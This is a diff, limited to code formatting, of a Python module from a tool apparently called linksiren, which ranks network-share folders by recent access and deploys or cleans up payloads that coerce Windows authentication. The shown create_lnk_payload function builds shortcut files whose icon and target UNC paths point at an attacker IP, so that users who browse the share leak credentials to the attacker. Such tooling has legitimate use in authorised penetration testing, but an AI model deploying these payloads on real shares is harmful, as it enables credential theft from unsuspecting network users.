@@ -5,9 +5,11 @@ payloads that coerce authentication based on recent access. This module can then
 deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
 bulk cleanup multiple types of payloads from the identified locations.
 """
+
 from datetime import datetime, timedelta
 from pathlib import Path
 import linksiren.target
+
 
 def process_targets(unc_paths: list):
     """
@@ -41,6 +43,7 @@ def process_targets(unc_paths: list):
 
     return targets
 
+
 def parse_target(unc_path: str):
     """
     Parses a UNC (Universal Naming Convention) path to extract the host and the path.
@@ -51,10 +54,11 @@ def parse_target(unc_path: str):
         tuple: A tuple containing the host and the path. The host is the third element in the
                split path, and the path is the remaining elements joined by backslashes.
     """
-    host = unc_path.split('\\')[2]
-    path = '\\'.join(unc_path.split('\\')[3:])
+    host = unc_path.split("\\")[2]
+    path = "\\".join(unc_path.split("\\")[3:])
 
     return host, path
+
 
 def is_valid_payload_name(payload_name, available_extensions):
     """
@@ -68,10 +72,14 @@ def is_valid_payload_name(payload_name, available_extensions):
     Accepts a potential payload name. Validates the payload name has an extension and that the
     extension is supported. Returns True if the payload name is valid or False if it is not.
     """
-    invalid_payload_message = 'Invalid payload extension provided. Payload must end in one of the'\
-                              'following:'
+    invalid_payload_message = (
+        "Invalid payload extension provided. Payload must end in one of the"
+        "following:"
+    )
     for available_extension in available_extensions:
-        invalid_payload_message = invalid_payload_message + (f'\n\t.{available_extension}')
+        invalid_payload_message = invalid_payload_message + (
+            f"\n\t.{available_extension}"
+        )
 
     payload_extension = Path(payload_name).suffix
     if payload_extension not in available_extensions:
@@ -101,19 +109,19 @@ def create_lnk_payload(attacker_ip, template_bytes):
     characters, the function prints a message and returns False. Otherwise, it returns the content
     of the generated shortcut file as bytes.
     """
-    img_unc_offset = 0x16D # Offset to the icon file unc path in the template
-    target_unc_offset = 0x931 # Offset to the target for the lnk file in the template
-    max_path = 239 # Max tested length is 238
+    img_unc_offset = 0x16D  # Offset to the icon file unc path in the template
+    target_unc_offset = 0x931  # Offset to the target for the lnk file in the template
+    max_path = 239  # Max tested length is 238
 
-    img_unc_path = f'\\\\{attacker_ip}\\test.ico'
-    target_unc_path = f'\\\\{attacker_ip}\\test'
+    img_unc_path = f"\\\\{attacker_ip}\\test.ico"
+    target_unc_path = f"\\\\{attacker_ip}\\test"
 
     if len(img_unc_path) >= max_path or len(target_unc_path) >= max_path:
         print("Path name too long for lnk template, skipping.")
         return False
 
-    img_unc_path = (img_unc_path + '\x00').encode('utf-16le')
-    target_unc_path = (target_unc_path + '\x00').encode('utf-16le')
+    img_unc_path = (img_unc_path + "\x00").encode("utf-16le")
+    target_unc_path = (target_unc_path + "\x00").encode("utf-16le")
 
     payload_bytes = template_bytes
 
@@ -172,8 +180,9 @@ def sort_rankings(folder_rankings):
     if folder_rankings is None:
         sorted_rankings = {}
     else:
-        sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1],
-                                      reverse=True))
+        sorted_rankings = dict(
+            sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True)
+        )
     return sorted_rankings
 
 
@@ -199,14 +208,16 @@ def filter_targets(targets, sorted_rankings, max_folders_per_target):
     # For each share target in the list
     for target in targets:
         # Get paths from sorted rankings associated with the target
-        matching_paths = [key for key in sorted_rankings.keys()
-                          if f'\\\\{target.host}\\' == key[:2+len(target.host)+1]]
+        matching_paths = [
+            key
+            for key in sorted_rankings.keys()
+            if f"\\\\{target.host}\\" == key[: 2 + len(target.host) + 1]
+        ]
 
         # Sort the matching share paths based on their ranking in descending order
         # and subsorted by key in alphabetical order. Keep only the top N.
         sorted_matching_paths = sorted(
-            matching_paths,
-            key=lambda key: (-sorted_rankings[key], key)
+            matching_paths, key=lambda key: (-sorted_rankings[key], key)
         )
 
         # Keep only the top N
@@ -214,4 +225,4 @@ def filter_targets(targets, sorted_rankings, max_folders_per_target):
 
         filtered_rankings.extend(top_matching_paths)
 
-    return  sorted(filtered_rankings)
+    return sorted(filtered_rankings)
